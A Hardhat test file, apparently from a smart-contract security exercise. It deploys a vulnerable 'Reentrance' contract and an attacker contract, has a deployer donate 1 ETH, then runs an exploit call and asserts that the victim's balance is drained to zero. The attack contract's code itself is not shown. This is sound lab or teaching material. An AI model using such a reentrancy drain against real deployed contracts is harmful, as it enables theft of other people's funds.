
import { expect } from "chai";
import { BigNumber } from "ethers";
import { deployments, ethers, getNamedAccounts} from "hardhat";
import "hardhat-deploy-ethers";

describe("ReentrancyAttack", async () =>{

    it("Should get funds from other accounts",async()=>{
        await deployments.fixture(["Reentrance","ReentrancyAttack"])
        const {deployer,exploiter}= await getNamedAccounts()
        const deployerAcc = await ethers.getSigner(deployer)
        const exploiterAcc=await ethers.getSigner(exploiter)

        const reentranceDeployment=await deployments.get('Reentrance')
        const reentrancyAttackDeployment=await deployments.get('ReentrancyAttack')
        const reentrance = await ethers.getContractAt('Reentrance',reentranceDeployment.address)
        const reentrancyAttack = await ethers.getContractAt('ReentrancyAttack',reentrancyAttackDeployment.address)

        //Deployer deposit funds with good intentions
        const deployerDonation=ethers.utils.parseEther("1.0")
        console.log(`Deployer donation: ${deployerDonation.toString()}`)
        await reentrance.connect(deployerAcc).donate(deployerAcc.address,{value:deployerDonation})
        expect(((await reentrance.balanceOf(deployer)) as BigNumber).eq(deployerDonation),"Problem during deployer deposit").to.be.true
        console.log(`Deployer effective donation: ${(await reentrance.balanceOf(deployer)).toString()}`)

        //Exploiter attack the contract
        const exploiterAmountToAttack=deployerDonation.div(10)//.sub(100)
        console.log(`Exploiter donation: ${exploiterAmountToAttack.toString()}`)
        const exploitTx=await reentrancyAttack.connect(exploiterAcc).exploitReentrance({value:exploiterAmountToAttack})
        const rcp=await exploitTx.wait()
        console.log(`Exploit tx minted ${rcp.status}`)
        expect(((await reentrance.balanceOf(deployer)) as BigNumber).eq(deployerDonation),"Deployer donation register was affected").to.be.true
        console.log(`Reentrance balance after attack ${await ethers.provider.getBalance(reentrance.address)}`)
        
        expect(((await ethers.provider.getBalance(reentrance.address)) as BigNumber).eq(0),"Reentrance fund weren't drained").to.be.true
        
    })

});
